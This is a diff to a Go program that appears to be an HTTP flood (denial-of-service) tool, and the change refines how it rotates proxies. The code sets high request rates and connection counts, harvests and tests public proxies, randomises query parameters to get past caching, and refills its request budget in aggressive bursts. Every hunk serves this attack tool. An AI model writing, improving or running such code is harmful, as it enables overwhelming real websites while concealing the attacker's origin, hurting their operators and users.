@@ -26,7 +26,7 @@ import (
 	"time"
 )
 
-const VERSION = "4.0.0"
+const VERSION = "4.0.1"
 const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
 const ACCEPT = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
@@ -56,6 +56,7 @@ type (
 		Pool        []string
 		ProxyStats  map[string]int
 		Index       int
+		CurrentProxy string
 		sync.Mutex
 	}
 	
@@ -98,9 +99,9 @@ func init() {
 
 func NewConfig() *Target {
 	return &Target{
-		Timeout:     5 * time.Second,      // Turunkan timeout
-		Rate:        1000,                 // Naikkan rate
-		Connections: 500,                  // Naikkan connections
+		Timeout:     5 * time.Second,
+		Rate:        1000,
+		Connections: 500,
 		Duration:    0,
 		Method:      "GET",
 		Proxy:       true,
@@ -146,26 +147,28 @@ func (t *Target) NextProxy() string {
 	defer t.Unlock()
 	if len(t.Pool) == 0 { return "" }
 	
-	// Gunakan round-robin dengan skip proxy yang gagal
 	for attempts := 0; attempts < len(t.Pool); attempts++ {
 		proxy := t.Pool[t.Index]
 		t.Index = (t.Index + 1) % len(t.Pool)
 		
-		// Skip proxy yang sering gagal
 		if t.ProxyStats[proxy] < 3 {
+			t.CurrentProxy = proxy
 			return proxy
 		}
 	}
-	return t.Pool[t.Index]
+	proxy := t.Pool[t.Index]
+	t.CurrentProxy = proxy
+	return proxy
 }
 
-func (t *Target) MarkProxy(proxy string, success bool) {
+func (t *Target) MarkProxy(success bool) {
 	t.Lock()
 	defer t.Unlock()
+	if t.CurrentProxy == "" { return }
 	if success {
-		t.ProxyStats[proxy] = 0
+		t.ProxyStats[t.CurrentProxy] = 0
 	} else {
-		t.ProxyStats[proxy]++
+		t.ProxyStats[t.CurrentProxy]++
 	}
 }
 
@@ -203,7 +206,6 @@ func (h *ProxyHunter) Harvest() []string {
 		},
 	}
 	
-	// Gunakan goroutine untuk parallel fetching
 	var wg sync.WaitGroup
 	results := make(chan []string, len(h.Sources))
 	
@@ -238,7 +240,6 @@ func (h *ProxyHunter) Harvest() []string {
 		all = append(all, proxies...)
 	}
 	
-	// Deduplicate
 	seen := make(map[string]bool)
 	var unique []string
 	for _, p := range all {
@@ -248,14 +249,12 @@ func (h *ProxyHunter) Harvest() []string {
 		}
 	}
 	
-	// Filter proxy - test kecepatan
 	fmt.Printf("🔍 Testing %d proxies...\n", len(unique))
 	var fastProxies []string
 	var mu sync.Mutex
 	var wgFilter sync.WaitGroup
 	
-	// Test proxy dengan parallel
-	sem := make(chan struct{}, 50) // Max 50 concurrent tests
+	sem := make(chan struct{}, 50)
 	for _, proxy := range unique {
 		wgFilter.Add(1)
 		go func(p string) {
@@ -277,7 +276,6 @@ func (h *ProxyHunter) Harvest() []string {
 }
 
 func (h *ProxyHunter) TestProxy(proxy string) bool {
-	// Test dengan timeout singkat
 	client := &http.Client{
 		Timeout: 2 * time.Second,
 		Transport: &http.Transport{
@@ -292,14 +290,12 @@ func (h *ProxyHunter) TestProxy(proxy string) bool {
 		},
 	}
 	
-	// Test dengan request kecil
 	resp, err := client.Get("http://httpbin.org/ip")
 	if err != nil {
 		return false
 	}
 	defer resp.Body.Close()
 	
-	// Hanya terima response cepat
 	return resp.StatusCode == 200
 }
 
@@ -371,7 +367,7 @@ func (f *Factory) Release() {
 func NewThrottle(rate int) *Throttle {
 	if rate <= 0 { return nil }
 	
-	burstSize := rate * 5 // Burst 5x lebih agresif
+	burstSize := rate * 5
 	t := &Throttle{
 		Tickets:   make(chan struct{}, burstSize),
 		Tick:      time.Second / time.Duration(rate),
@@ -380,7 +376,6 @@ func NewThrottle(rate int) *Throttle {
 		BurstSize: burstSize,
 	}
 	
-	// Isi penuh dengan burst
 	for i := 0; i < burstSize; i++ {
 		select {
 		case t.Tickets <- struct{}{}:
@@ -404,7 +399,6 @@ func (t *Throttle) Pump() {
 			t.Lock()
 			now := time.Now()
 			if now.Sub(t.Refilled) >= t.Tick {
-				// Tambah token lebih agresif
 				for i := 0; i < 5; i++ {
 					select {
 					case t.Tickets <- struct{}{}:
@@ -632,7 +626,7 @@ func main() {
 		cancel()
 	}()
 
-	factory := BuildFactory(50, cfg.Timeout, cfg) // Naikkan pool size
+	factory := BuildFactory(50, cfg.Timeout, cfg)
 	defer factory.Release()
 
 	var throttle *Throttle
@@ -671,7 +665,7 @@ func RandomString(n int, rng *rand.Rand) string {
 }
 
 func RandomParams(rng *rand.Rand) string {
-	n := 3 + rng.Intn(10) // Lebih banyak parameter
+	n := 3 + rng.Intn(10)
 	var parts []string
 	for i := 0; i < n; i++ {
 		k := RandomString(3+rng.Intn(10), rng)
@@ -722,7 +716,7 @@ func Launch(ctx context.Context, cancel context.CancelFunc, cfg *Target, parsed 
 
 	monitor := make(chan struct{})
 	go func() {
-		ticker := time.NewTicker(1 * time.Second) // Update lebih sering
+		ticker := time.NewTicker(1 * time.Second)
 		defer ticker.Stop()
 		for {
 			select {
@@ -822,22 +816,19 @@ func Fire(ctx context.Context, client *http.Client, cfg *Target, parsed *url.URL
 					time.Sleep(time.Duration(50*(1<<uint(attempt))) * time.Millisecond)
 					continue
 				}
+				cfg.MarkProxy(false)
 				return false
 			}
 			defer resp.Body.Close()
 			
-			// Baca body untuk memastikan koneksi reusable
 			io.Copy(io.Discard, resp.Body)
 			
-			// Catat status code
 			Stats.Lock()
 			Stats.Codes[resp.StatusCode]++
 			Stats.Unlock()
 			
-			// Mark proxy success/fail
-			if cfg.Proxy {
-				cfg.MarkProxy(client.Transport.(*http.Transport).Proxy(nil).String(), resp.StatusCode == 200)
-			}
+			success := resp.StatusCode == 200
+			cfg.MarkProxy(success)
 			
 			if Secure && resp.StatusCode >= 500 {
 				if Debug {
@@ -846,15 +837,15 @@ func Fire(ctx context.Context, client *http.Client, cfg *Target, parsed *url.URL
 				return false
 			}
 			
-			// Log slow responses
 			if time.Since(start) > 2*time.Second && Debug {
 				fmt.Printf("\n🐌 Slow response: %v\n", time.Since(start))
 			}
 			
-			return resp.StatusCode == 200
+			return success
 		}
 	}
 	
+	cfg.MarkProxy(false)
 	return false
 }
 
